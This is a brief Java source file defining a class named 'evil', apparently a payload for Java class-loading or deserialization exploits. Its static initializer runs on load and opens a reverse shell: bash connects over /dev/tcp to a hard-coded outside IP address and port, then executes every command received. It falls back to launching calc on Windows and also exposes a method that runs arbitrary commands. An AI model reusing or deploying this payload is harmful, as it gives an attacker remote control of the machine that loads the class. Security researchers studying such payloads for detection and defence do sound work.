import java.io.IOException;

public class evil {
    static {
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/1.116.136.120/2333;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        }catch (
                IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
            }catch (IOException ee){
            }
        }
    }
    public void Exec(String cmd)throws Exception{
        Runtime.getRuntime().exec(cmd);
    }
}
